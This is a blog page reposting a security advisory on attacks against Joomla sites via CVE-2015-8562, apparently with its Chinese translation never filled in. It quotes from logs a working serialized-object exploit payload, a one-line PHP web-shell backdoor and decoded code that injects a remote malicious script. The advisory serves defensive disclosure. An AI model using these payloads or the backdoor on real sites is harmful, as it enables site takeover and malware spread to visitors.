<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Joomla CVE-2015-8562</title>

    <!-- Bootstrap Core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/sb-admin.css" rel="stylesheet">

    <!-- Morris Charts CSS -->
    <link href="../css/plugins/morris.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- highlight.js -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.5.0/styles/ir_black.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.5.0/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <div id="wrapper">

        <!-- Navigation -->
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="../index.html">打鐵鋪</a>
            </div>
 

            <!-- Sidebar Menu Items - These collapse to the responsive navigation menu on small screens -->
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav side-nav">
                    <li>
                        <a href="../index.html"><i class="fa fa-fw fa-dashboard"></i> Index</a>
                    </li>
                    <li>
                        <a href="../AboutMe.html"><i class="fa fa-fw fa-edit"></i> About Me</a>
                    </li>
                    <li  class="active">
                        <a href="../Web.html"><i class="fa fa-fw fa-desktop"></i> Web Security</a>
                    </li>
                    <li>
                        <a href="../Reverse.html"><i class="fa fa-fw fa-wrench"></i> Reverse</a>
                    </li>
                    <li>
                        <a href="../Translate.html"><i class="fa fa-fw fa-file"></i> Translate</a>
                    </li>
                    <li>
                        <a href="../Note.html"><i class="fa fa-fw fa-table"></i> Note</a>
                </ul>
                    </li>
            </div>
            <!-- /.navbar-collapse -->
        </nav>

        <div id="page-wrapper">

            <div class="container-fluid">

                <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <ol class="breadcrumb">
                            <li>
                                <i class="fa fa-dashboard"></i>  <a href="index.html">Blog</a>
                            </li>
                            <li class="active">
                                <i class="fa fa-fw fa-file"></i>  <a href="../Web.html">Web</a>
                            </li>
                            <li class="active">
                                New Realstatistics Attack Vector Compromising Joomla Sites.
                            </li>
                        </ol>
                    </div>
                </div>
                <!-- /.row -->

                <div class="row">
                    <div class="jumbotron">
                    <h2 class="page-header">
                    New Realstatistics Attack Vector Compromising Joomla Sites<br>
                    新的
                    </h2>
                    </div>
                </div>

                <div class="row">
                <div class="col-lg-4"></div>
                <div class="col-lg-4">
                    <p class="lead">
                    文章原文轉自 :
                    <a target="_blank" href="https://blog.sucuri.net/2016/07/new-realstatistics-attack-vector-compromising-joomla-sites.html">blog.sucuri.net</a>
                     
                    </p>
                </div>
                <div class="col-lg-4"></div>
                </div>

            <!-- Img    -->
            <div class="row">
                <div class="col-lg-2"></div>
                    <div class="col-lg-8">
                        <img class="img-thumbnail" src="2016-08-15/joomla.jpg" >
                    </div>
                <div class="col-lg-2"></div>
            </div>
            <!-- Img End-->
            <br>

            <!-- 01        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Over the past few weeks we’ve seen a large number of Joomla websites compromised with the <a target="_blank" href="https://blog.sucuri.net/2016/07/joomla-wordpress-affected-by-realstatistics-infection-campaign-distributing-randsomware-malware.html"> Realstatistics malware campaign.</a> This mass infection is still evolving and continues to distribute harmful ransomware to compromised website visitors.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 01 End -->
            <!-- 02        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Today we are providing more context on the new attack vector and exploitation process used to to compromise these sites.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 02 End -->
            <!-- 03        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Today we are providing more context on the new attack vector and exploitation process used to to compromise these sites.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 03 End -->
            <!-- 04     -->
                <div class="row">
                <div class="col-lg-4"></div>
                <div class="col-lg-4">
                    <p class="lead">
                    Joomla 
                    <a target="_blank" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562">CVE-2015-8562
                    </a>
                     
                    </p>
                </div>
                <div class="col-lg-4"></div>
                </div>
            <!-- 04 End -->
            <!-- 05        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        The initial attack vector is a variation of the <a target="_blank" href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html"> Remote Command Execution vulnerability in Joomla</a> that was heavily exploited at the end of last year. Despite the fact that it has been patched, we still see many attempts to exploit this vulnerability using the original methods we disclosed. Almost all web application firewalls have now virtually patched this variation of the exploit. As a result, we see fewer successful attempts at compromising Joomla sites with this older vulnerability.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 05 End -->
            <!-- 06        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        The new variation we discovered is using a new vector with the filter-search option which hasn’t yet been disclosed.  This results in a far higher success rate, and has a lot to do with why the Realstatistics malware campaign is successful in compromising a high number of sites in such a short period of time.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 05 End -->
            <!-- 06        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        New Attack Vector
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 06 End -->
            <!-- 07 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
46.183.219.91 - - [19/Jun/2016:03:16:21 -0400] 
"POST /?option=com_tags HTTP/1.1" 403 4229 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
"POSTLOG:filter-search=bigus%7D__hxsjcurrrt%7CO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A71%3A%22eval%28base64_decode%28%24_SERVER%5B%27HTTP_QGYSD%27%5D%29%29%3BJFactory%3A%3AgetConfig%28%29%3Bexit%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7D\xF0\xFD\xFD\xFD"

</code>
</pre>
                </div>
                </div>
            <!-- 07 Code End -->
            <!-- 08        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        As you can see from the date stamp, the initial vulnerability was exploited in June, but we didn’t see attempts to access the backdoor until the beginning of July:
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 08 End -->
            <!-- 09 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
46.183.219.91 - - [01/Jul/2016:04:41:20 -0400] 
"POST /modules/cache.uniq_04793.php HTTP/1.1" 403 4261 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
"POSTLOG:&php_func=assert&php=print%28%22MY_S%22.%22UCCESS%22%29%3B"

</code>
</pre>
                </div>
                </div>
            <!-- 09 Code End -->
            <!-- 10        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        With this request, attackers are simply testing whether the backdoor installation was successful or not.

                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 10 End -->
            <!-- 11        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        The content of this backdoor is common to many backdoors we see:
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 11 End -->
            <!-- 12 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="php">
&lt;?php if(isset($_POST["php_func"])){@$_POST["php_func"](stripslashes($_POST["php"]));};?&gt;

</code>
</pre>
                </div>
                </div>
            <!-- 12 Code End -->
            <!-- 13        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Payload
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 13 End -->
            <!-- 14        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        After the attempts to see whether the backdoor was successful or not, attackers attempt to inject the payload utilizing the backdoor.

                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 14 End -->
            <!-- 15 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
46.183.219.91 - - [01/Jul/2016:09:35:27 -0400] 
"POST /modules/cache.uniq_04793.php HTTP/1.1" 403 4261 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
"POSTLOG:&php_func=assert&php=assert%28base64_decode%28str_rot13%28%27MKMuoPuvLKAyAwEsMTIwo2EyXUA0py9lo3DkZltaHHEwnaO6rJukHR52EwWWAHDlqKyZZzqHpUb5nUSDIwqEETWOHUMSHxIVI0ySoGOgDzbjJRAgAQuQZ09vpR4jJSSRLauhFwIxFmWOnH1HFUEQEx5uD1IOq3O6rJckHR9zGRb1LKSXH2SAEmO2EacGZxkWDKqjraydpIOJqUSIrJcAEmO2pIEWAUSDBIuZF011FQWOoT5YGmOJqx9gpUcnBIM6qGOkIH42JJj5oR1XH2MjZ0I1pIE5oKSHrKqjoQIdpUb4nJ5uJzyZFwI1o1I5ZT5XDJ1M….”

</code>
</pre>
                </div>
                </div>
            <!-- 15 Code End -->
            <!-- 16        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        That is just part of the encoded payload in the request above, but after decoding the full payload this is the result:
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 16 End -->
            <!-- 17 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
print "KeyCheckFront";
...

$inj_code = '&lt;script language="JavaScript" type="text/JavaScript" 

src="hxxp://realstatistics[.]pro/js/analytics.php?id=123"&gt;&lt;/script&gt;';

//$inj_code = '&lt;!-- lol777 --&gt;';

$inj_search = '&lt;/head&gt;';
...

</code>
</pre>
                </div>
                </div>
            <!-- 17 Code End -->
            <!-- 18        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        As you can see from the code, the payload is injecting fake Realstatistics analytics code into the head section of any PHP template on the site.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 18 End -->
            <!-- 19        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Check Your Joomla Sites
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 19 End -->
            <!-- 20     -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        This infection is only impacting unpatched Joomla sites, so make sure that your Joomla sites are up-to-date. This is a new attack vector on an old vulnerability, so if you can’t patch, you should be sure your website firewall is virtually patching this new variation.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 20 End -->
            <!-- 21     -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        We recommend checking your logs for requests from 46 .183 .219 .91 – if you find requests similar to the ones in this post, consider your website compromised. At this point you should take steps to remove the malware immediately and prevent reinfection.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 21 End -->
            <!-- 22        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        If you are using our <a target="_blank" href="https://sucuri.net/website-firewall/"> CloudProxy Website Firewall</a>, your site is protected against this vulnerability through our virtual patching feature.  <a target="_blank" href="https://sucuri.net/website-antivirus/"> Our incident response team</a> is always standing by ready to assist you in cleaning and protecting your site if you need assistance.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 22 End -->

            <!-- /.container-fluid -->

        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="../js/jquery.js"></script>


    <!-- Bootstrap Core JavaScript -->
    <script src="../js/bootstrap.min.js"></script>

    <!-- Morris Charts JavaScript -->
    <script src="../js/plugins/morris/raphael.min.js"></script>
    <script src="../js/plugins/morris/morris.min.js"></script>
    <script src="../js/plugins/morris/morris-data.js"></script>

</body>

</html>
